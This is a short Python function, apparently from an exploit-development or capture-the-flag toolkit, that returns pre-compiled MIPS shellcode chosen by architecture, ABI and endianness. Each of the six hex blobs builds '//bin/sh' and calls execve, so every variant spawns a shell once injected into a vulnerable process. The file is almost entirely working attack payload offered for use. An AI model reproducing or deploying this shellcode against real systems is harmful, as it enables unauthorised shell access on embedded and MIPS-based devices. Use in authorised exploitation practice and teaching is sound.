"""
For each MIPS variant, include the pre-compiled shellcode and then parse the `context`
argument to determine which one to return. Each bit of shellcode comes from the
`../shellcode/` directory.
"""

def mips_shellcode(context, n32 = False) -> bytes:
    if context.arch == 'mips' and context.endian == 'big' and not n32:
        # o32 big endian
        return bytes.fromhex('3c092f2f35296269afa9fff43c096e2f35297368afa9fff8afa0fffc27bdfff403a020202805ffff2806ffff34020fab0101010c')
    elif context.arch == 'mips' and context.endian == 'little' and not n32:
        # o32 little endian
        return bytes.fromhex('6269093c2f2f2935f4ffa9af7368093c6e2f2935f8ffa9affcffa0aff4ffbd272020a003ffff0528ffff0628ab0f02340c010101')
    
    elif context.arch == 'mips' and context.endian == 'big' and n32:
        # n32 big endian
        return bytes.fromhex('3c0d2f2f35ad6269afadfff43c0d6e2f35ad7368afadfff8afa0fffc67bdfff403a0202d2805ffff2806ffff340217a90101010c')
    elif context.arch == 'mips' and context.endian == 'little' and n32:
        # n32 little endian
        return bytes.fromhex('62690d3c2f2fad35f4ffadaf73680d3c6e2fad35f8ffadaffcffa0aff4ffbd672d20a003ffff0528ffff0628a91702340c010101')
    
    elif context.arch == 'mips64' and context.endian == 'big':
        # n64 big endian
        return bytes.fromhex('3c0d2f2f35ad6269afadfff43c0d6e2f35ad7368afadfff8afa0fffc67bdfff403a0202d2805ffff2806ffff340213c10101010c')
    elif context.arch == 'mips64' and context.endian == 'little':
        # n64 little endian
        return bytes.fromhex('62690d3c2f2fad35f4ffadaf73680d3c6e2fad35f8ffadaffcffa0aff4ffbd672d20a003ffff0528ffff0628c11302340c010101')

    else:
        raise ValueError(f"Unsupported architecture: {context.arch} with endianness: {context.endian}")